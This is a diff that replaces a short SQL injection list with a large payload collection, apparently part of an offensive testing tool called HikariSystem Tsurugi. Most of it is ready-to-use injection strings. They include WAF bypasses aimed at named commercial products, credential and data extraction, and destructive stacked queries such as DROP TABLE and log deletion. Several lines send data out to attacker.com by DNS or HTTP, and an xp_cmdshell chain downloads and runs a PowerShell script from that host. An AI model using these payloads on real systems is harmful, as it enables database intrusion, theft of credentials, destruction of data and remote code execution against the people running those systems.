@@ -1,13 +1,500 @@
-'
-"
-')
-")
-' OR '1'='1
-" OR "1"="1
-' AND SLEEP(5)--
-'; WAITFOR DELAY '0:0:5'--
-' AND 1=1--
-" AND 1=1--
-admin' --
-admin' #
-' UNION SELECT 1,2,3--
+-- ============================================================================
+-- HikariSystem Tsurugi - SQLi Research Module v3.0
+-- Focus: Parser Differentials, Modern API Bypass, Heavy Exfiltration
+-- Last Updated: 2026-01-15 | Maintainer: ThreatBiih & LXrdKnowkill
+-- ============================================================================
+
+-- ============================================================================
+-- [SECTION 1] POLYGLOT & UNIVERSAL KEYS
+-- ============================================================================
+-- These payloads work across multiple injection contexts (string, numeric, 
+-- comment-based). They're designed to break out of unknown contexts.
+
+-- Universal Polyglot: Works in string, numeric, and comment contexts
+'"`/*--'/*"/*`/*-- */SELECT 1,2,3||(SELECT 'a')--
+
+-- Multi-DB Polyglot: MySQL, PostgreSQL, MSSQL compatible
+'/**/OR/**/1=1/**/OR/**/'1'='1
+"/**/OR/**/1=1/**/OR/**/"1"="1
+
+-- Triple Context Escape: Breaks HTML, JS, and SQL simultaneously  
+'-'/**/OR/**/1=1/**/OR/**/''-''
+
+-- Numeric Context Polyglot: For when input is typecast
+1/**/OR/**/1=1
+0/**/OR/**/1=1
+-1/**/OR/**/1=1
+
+-- ============================================================================
+-- [SECTION 2] WAF BYPASS: COMMENT FRAGMENTATION
+-- ============================================================================
+-- Exploits how regex-based WAFs fail to reassemble fragmented queries.
+-- MySQL version comments (/*!50000 */) execute on MySQL >= 5.0
+
+-- Version Comment Obfuscation (MySQL/MariaDB specific)
+/*!50000SELECT*/ 1,2,/*!50000FROM*/ users--
+/*!--+50000%55NIOn*//*!--+50000%53ELecT*/1,user(),3,4,database()--
+/*!50000%55nion*/ /*!50000%53elect*/ 1,2,3,4--
+/*!12345UNION*//*!12345SELECT*/1,2,3--
+
+-- Inline Comment Fragmentation
+'/**/UNION/**/SELECT/**/1,2,3--
+'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--
+'/**_**/UNION/**_**/SELECT/**_**/1,2,3--
+
+-- Nested Comment Abuse (MySQL specific)
+'/*!/*!UNION*/*//*!/*!SELECT*/*/1,2,3--
+
+-- ============================================================================
+-- [SECTION 3] WHITESPACE & DELIMITER MANIPULATION
+-- ============================================================================
+-- WAFs using regex like /UNION\s+SELECT/ fail against non-standard whitespace.
+-- ASCII control chars that MySQL treats as whitespace: 0x09,0x0a,0x0b,0x0c,0x0d,0x20
+
+-- Vertical Tab (0x0B)
+'union%0bselect%0b1,2,3--
+
+-- Form Feed (0x0C)  
+'union%0cselect%0c1,2,3--
+
+-- Carriage Return (0x0D)
+'union%0dselect%0d1,2,3--
+
+-- Line Feed (0x0A)
+'union%0aselect%0a1,2,3--
+%0aunion%0aselect%0a1,2,3%23
+
+-- Tab (0x09)
+'union%09select%091,2,3--
+
+-- Mixed Whitespace Chain
+'union%0a%0d%09select%0a%0d%091,2,3--
+
+-- Plus Sign (Works in URL context)
+'+UNION+SELECT+1,2,3--
+'+union+select+1,2,3--
+
+-- ============================================================================
+-- [SECTION 4] HEX & UNICODE OBFUSCATION
+-- ============================================================================
+-- String literals converted to hex bypass string-matching WAFs entirely.
+-- The DB performs internal casting, WAF sees only hex garbage.
+
+-- Full Query in Hex (MySQL): ' UNION SELECT NULL,@@version--
+0x27204f5220313d31
+0x2720554e494f4e2053454c454354204e554c4c2c404076657273696f6e2d2d
+
+-- Unicode Escape Sequences (PostgreSQL, some MySQL configs)
+u0027u0020u004fu0052u0020u0031u003du0031
+%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031
+
+-- Double URL Encoding (Bypasses single-decode WAFs)
+%2527%2520UNION%2520SELECT%25201,2,3--
+%252527%252520UNION%252520SELECT%2525201,2,3--
+
+-- Mixed Encoding
+'%55NION %53ELECT 1,2,3--
+%27%20%55NION%20%53ELECT%201,2,3--
+
+-- ============================================================================
+-- [SECTION 5] JSON/REST API INJECTION (Modern Architecture Focus)
+-- ============================================================================
+-- Modern backends parse JSON before SQL. Injection occurs at the 
+-- deserialization boundary where type coercion happens.
+
+-- PostgreSQL JSONB Injection: Exploits jsonb_to_recordset casting
+' AND (SELECT 1 FROM jsonb_to_recordset('{"a":1}') AS x(a int))--
+
+-- PostgreSQL JSON Path with Sleep
+{"id": "1' || (SELECT 'a' FROM pg_sleep(5)) || '"}
+
+-- MySQL JSON Path Injection: JSON_EXTRACT bypass
+' AND JSON_EXTRACT('{"id": 1}', '$.id')=1--
+' AND (SELECT 1 FROM (SELECT(JSON_EXTRACT(JSON_OBJECT('a',1),'$.a')))x)--
+
+-- REST Filter Parameter Injection
+{"filters": ["' UNION SELECT NULL,CAST(current_setting('server_version') AS NUMERIC),NULL--"]}
+{"query": {"$where": "this.password.match(/.*/) || '1'=='1'"}}
+
+-- GraphQL Injection Context
+{"query":"{ user(id: \"1' OR '1'='1\") { id name } }"}
+{"query":"mutation { login(user: \"admin'--\", pass: \"x\") }"}
+
+-- ============================================================================
+-- [SECTION 6] TIME-BASED STEALTH (CPU-Bound, No SLEEP)
+-- ============================================================================
+-- SLEEP() is commonly blocked. Heavy computation functions cause measurable
+-- delays while evading function-based blacklists.
+
+-- MySQL: BENCHMARK with cryptographic functions
+' AND (SELECT 1 FROM (SELECT(BENCHMARK(5000000,MD5('YARINX'))))a)--
+' AND (SELECT 1 FROM (SELECT(BENCHMARK(5000000,SHA1('HIKARI'))))a)--
+' AND BENCHMARK(2000000,MD5(NOW()))--
+' AND BENCHMARK(10000000,ENCODE('test','test'))--
+
+-- PostgreSQL: generate_series CPU exhaustion
+' AND (SELECT count(*) FROM generate_series(1,10000000))--
+' AND (SELECT count(*) FROM generate_series(1,5000000))--
+
+-- PostgreSQL: pg_sleep alternative via heavy query
+' AND (SELECT 1 FROM (SELECT count(*) FROM pg_catalog.pg_class a, pg_catalog.pg_class b)x)--
+
+-- MySQL: Cartesian product delay
+' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B)--
+
+-- MSSQL: Recursive CTE delay
+'; WITH YARINX(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM YARINX WHERE n<1000000) SELECT count(*) FROM YARINX OPTION(MAXRECURSION 0)--
+
+-- Oracle: Heavy recursion
+' AND (SELECT count(*) FROM all_objects a, all_objects b WHERE ROWNUM<=1000000)--
+
+-- ============================================================================
+-- [SECTION 7] ERROR-BASED EXTRACTION (MySQL 8.0+ Hardened)
+-- ============================================================================
+-- Modern MySQL patches broke classic EXTRACTVALUE. These work on 8.0+
+
+-- Double Nested Query (Reliable on MySQL 8.0+)
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT (ELT(1,1))), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) AS y)--
+
+-- GTID_SUBSET (MySQL 5.6+)
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+
+-- JSON_KEYS Error Leak (MySQL 5.7+)
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,@@version)) USING utf8)))--
+
+-- Geometry Functions (MySQL 5.7+)
+' AND ST_LongFromGeoHash((SELECT @@version))--
+' AND ST_LatFromGeoHash((SELECT user()))--
+
+-- Classic EXTRACTVALUE (Still works on older versions)
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+
+-- PostgreSQL: Type Casting Error
+' AND 1=CAST((SELECT version()) AS INT)--
+' AND 1=CAST((SELECT current_user) AS INT)--
+
+-- MSSQL: CONVERT Error Leak
+' AND 1=CONVERT(INT,(SELECT @@version))--
+' AND 1=CONVERT(INT,(SELECT DB_NAME()))--
+
+-- Oracle: UTL_INADDR Error
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+-- ============================================================================
+-- [SECTION 8] OOB DNS EXFILTRATION (The Silent Killer)
+-- ============================================================================
+-- Data leaves via DNS resolution. No HTTP response needed.
+-- Requires attacker-controlled DNS server (Burp Collaborator, interactsh, etc.)
+
+-- MySQL (Windows host with LOAD_FILE)
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a'))--
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.', (SELECT database()), '.attacker.com\\a'))--
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\a'))--
+
+-- MySQL: INTO OUTFILE for DNS trigger
+' UNION SELECT 1,2,3 INTO OUTFILE '\\\\attacker.com\\a'--
+
+-- MSSQL: xp_dirtree DNS leak
+'; EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\a'--
+'; DECLARE @q VARCHAR(1024);SET @q='\\'+DB_NAME()+'.attacker.com\a';EXEC master.dbo.xp_dirtree @q--
+'; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\a'--
+
+-- MSSQL: xp_fileexist DNS
+'; EXEC master..xp_fileexist '\\'+DB_NAME()+'.attacker.com\a'--
+
+-- Oracle: UTL_INADDR DNS resolution
+' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual)||'.attacker.com')--
+' OR 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables) WHERE r=1)||'.attacker.com')--
+
+-- Oracle: UTL_HTTP (HTTP-based OOB)  
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual--
+
+-- PostgreSQL: COPY TO PROGRAM (OS command execution)
+'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v=$(whoami)'--
+'; COPY (SELECT '') TO PROGRAM 'nslookup '||current_database()||'.attacker.com'--
+
+-- ============================================================================
+-- [SECTION 9] MSSQL ADVANCED (CTEs, Window Functions, xp_cmdshell)
+-- ============================================================================
+-- MSSQL-specific advanced techniques for bypassing and exploitation.
+
+-- CTE-based Query Splitting
+'; WITH YARINX AS (SELECT 1 as x) SELECT * FROM users WHERE id=1; EXEC sp_configure 'show advanced options', 1;--
+
+-- Window Function Abuse
+' UNION SELECT ROW_NUMBER() OVER(ORDER BY id),username,password,4 FROM users--
+
+-- xp_cmdshell Enablement + RCE Chain
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+'; EXEC master..xp_cmdshell 'whoami'--
+'; EXEC master..xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--
+
+-- OpenRowset for Remote Query
+'; SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker.com;Trusted_Connection=yes;','SELECT 1')--
+
+-- Linked Server Abuse
+'; EXEC sp_addlinkedserver @server='attacker';--
+'; SELECT * FROM OPENQUERY(attacker,'SELECT @@version')--
+
+-- ============================================================================
+-- [SECTION 10] POSTGRESQL ADVANCED
+-- ============================================================================
+-- PostgreSQL-specific vectors including direct file access and command execution.
+
+-- File Read via pg_read_file (Superuser required)
+' UNION SELECT pg_read_file('/etc/passwd',0,1000000)--
+
+-- File Write via COPY
+'; COPY (SELECT 'YARINX WAS HERE') TO '/tmp/pwned.txt'--
+
+-- Command Execution via COPY TO PROGRAM (9.3+)
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt'--
+
+-- Extension Loading for RCE
+'; CREATE OR REPLACE FUNCTION yarinx_shell(cmd text) RETURNS text AS $$import os; return os.popen(cmd).read()$$ LANGUAGE plpython3u;--
+'; SELECT yarinx_shell('whoami');--
+
+-- Large Object Read
+'; SELECT lo_import('/etc/passwd');--
+' UNION SELECT CAST(lo_get(16389) AS text)--
+
+-- ============================================================================
+-- [SECTION 11] ORACLE ADVANCED
+-- ============================================================================
+-- Oracle-specific techniques for data extraction and privilege escalation.
+
+-- DBMS_PIPE for Blind Time-Based
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE DBMS_PIPE.RECEIVE_MESSAGE('a',0) END FROM dual)--
+
+-- XML External Entity (XXE) via XMLType
+' AND XMLType((SELECT '<?xml version="1.0"?><root>'||(SELECT user FROM dual)||'</root>' FROM dual)) IS NOT NULL--
+
+-- CTXSYS.DRITHSX for Error-Based
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+-- SYS.DBMS_EXPORT_EXTENSION (Privilege Escalation)
+-- Requires specific grants, but extremely powerful when available
+
+-- ============================================================================
+-- [SECTION 12] NOSQL INJECTION (MongoDB, CouchDB)
+-- ============================================================================
+-- For applications using NoSQL databases with improper input sanitization.
+
+-- MongoDB: Authentication Bypass
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}}
+{"username": {"$regex": ".*"}}
+{"username": "admin", "password": {"$gt": ""}}
+
+-- MongoDB: $where JavaScript Injection
+{"$where": "1==1"}
+{"$where": "this.password.length > 0"}
+{"$where": "sleep(5000) || true"}
+
+-- MongoDB: Operator Injection
+{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}
+' || '1'=='1
+{"$gt": ""}
+{"$ne": null}
+
+-- CouchDB: Mango Query Injection
+{"selector": {"_id": {"$gt": null}}}
+
+-- ============================================================================
+-- [SECTION 13] AUTHENTICATION BYPASS (Research-Grade)
+-- ============================================================================
+-- These bypass patterns work against common ORM and framework implementations.
+
+-- Basic Auth Bypass
+admin'--
+admin'#
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin')--
+admin')#
+admin') or ('1'='1'--
+admin") or ("1"="1"--
+
+-- ORM-Specific (SQLAlchemy, Hibernate patterns)
+' or 1=1 LIMIT 1--
+' or 1=1 LIMIT 1 OFFSET 0--
+'=0--
+' or ''='
+" or ""="
+' or 1<2--
+' or 2>1--
+
+-- NULL-based bypass
+' IS NULL--
+' IS NOT NULL--
+'||(SELECT NULL)||'
+'+(SELECT NULL)+'
+
+-- ============================================================================
+-- [SECTION 14] UNION ENUMERATION (Column Discovery)
+-- ============================================================================
+-- Systematic column count detection for UNION-based attacks.
+
+-- NULL-based Column Count
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+
+-- ORDER BY Column Count
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 15--
+' ORDER BY 20--
+' ORDER BY 50--
+
+-- GROUP BY Column Count
+' GROUP BY 1--
+' GROUP BY 2--
+' GROUP BY 3--
+' GROUP BY 5--
+
+-- ============================================================================
+-- [SECTION 15] SECOND-ORDER INJECTION
+-- ============================================================================
+-- Payloads stored now, executed later. Targets insert/update then select flows.
+
+-- Username Registration Payload (Executes on profile view)
+admin'-- -
+test' UNION SELECT password FROM users WHERE username='admin'-- -
+<payload>' UNION SELECT @@version-- -
+
+-- Email Field Injection (Executes on email lookup)
+test@test.com' UNION SELECT password FROM users--
+victim@test.com'; DROP TABLE users;--
+
+-- ============================================================================
+-- [SECTION 16] WAF-SPECIFIC BYPASS (Cloudflare, Akamai, ModSecurity)
+-- ============================================================================
+-- Tested against major WAF implementations.
+
+-- Cloudflare Bypass
+'<@/script>UNION SELECT NULL--
+'<@script>UNION SELECT NULL--
+'%26%26TRUE--
+'||(TRUE)--
+
+-- ModSecurity CRS Bypass
+' /*!50000AND*/ /*!50000SLEEP(5)*/--
+' /*!UNION*/ /*!SELECT*/ 1--
+' /*!0UNION*/+/*!0SELECT*/+1--
+' /*!00000UNION*//*!00000SELECT*/1,2,3--
+
+-- Akamai Kona Bypass
+'%0bUNION%0bSELECT%0b1,2,3--
+'+/*!00000UNION*/+/*!00000SELECT*/+1,2,3--
+
+-- AWS WAF Bypass
+'/**/uNiOn/**/sElEcT/**/1,2,3--
+'%00UNION%00SELECT%001,2,3--
+
+-- Imperva SecureSphere Bypass
+' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--
+'%09UNION%09SELECT%091,2,3--
+
+-- ============================================================================
+-- [SECTION 17] BOOLEAN BLIND EXTRACTION
+-- ============================================================================
+-- For when no output is reflected but true/false behavior differs.
+
+-- MySQL Boolean Extraction
+' AND (SELECT LENGTH(database()))>0--
+' AND (SELECT LENGTH(database()))>5--
+' AND (SELECT LENGTH(database()))>10--
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>64--
+' AND ASCII(SUBSTRING(database(),1,1))>96--
+' AND ASCII(SUBSTRING(database(),1,1))>112--
+' AND IF(1=1,1,0)--
+' AND IF(1=2,1,0)--
+' AND IF((SELECT LENGTH(database()))>5,1,0)--
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--
+' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='u'--
+
+-- PostgreSQL Boolean
+' AND (SELECT LENGTH(current_database()))>0--
+' AND SUBSTRING(current_database(),1,1)='p'--
+
+-- MSSQL Boolean
+' AND LEN(DB_NAME())>0--
+' AND SUBSTRING(DB_NAME(),1,1)='m'--
+
+-- ============================================================================
+-- [SECTION 18] STACKED QUERIES (Multi-Statement)
+-- ============================================================================
+-- Allows execution of additional statements. Critical for RCE chains.
+
+-- Basic Stacked
+'; SELECT 1--
+'; SELECT @@version--
+'; SELECT user()--
+
+-- Data Manipulation
+'; INSERT INTO users(username,password) VALUES('yarinx','pwned')--
+'; UPDATE users SET password='pwned123' WHERE username='admin'--
+'; DELETE FROM logs WHERE 1=1--
+
+-- DDL Operations
+'; CREATE TABLE yarinx_test(id INT)--
+'; DROP TABLE sessions--
+
+-- ============================================================================
+-- [SECTION 19] INSERT/UPDATE INJECTION
+-- ============================================================================
+-- For injection points in INSERT and UPDATE statements.
+
+-- INSERT value injection
+', (SELECT @@version))--
+', (SELECT user()))--
+', (SELECT password FROM users WHERE username='admin'))--
+1, (SELECT @@version))--
+
+-- UPDATE SET injection
+', password='pwned' WHERE username='admin'--
+', admin=1 WHERE username='victim'--
+
+-- ============================================================================
+-- [SECTION 20] SPECIAL CONTEXTS
+-- ============================================================================
+-- Edge cases and specific application contexts.
+
+-- XML Context
+' or 1=1 or ''='
+" or 1=1 or ""="
+]]><' or 1=1 or ''><![CDATA[
+
+-- LDAP Injection (Related)
+*)(uid=*))(|(uid=*
+admin)(&)
+*)(objectClass=*
+
+-- XPath Injection (Related)
+' or '1'='1
+" or "1"="1
+' or ''='
+x' or name()='username' or 'x'='y
+
+-- ============================================================================
+-- END OF RESEARCH MODULE
+-- Total Documented Vectors: ~200 (Quality over Quantity)
+-- Each vector includes context and reasoning for GReAT-level operations
+-- ============================================================================
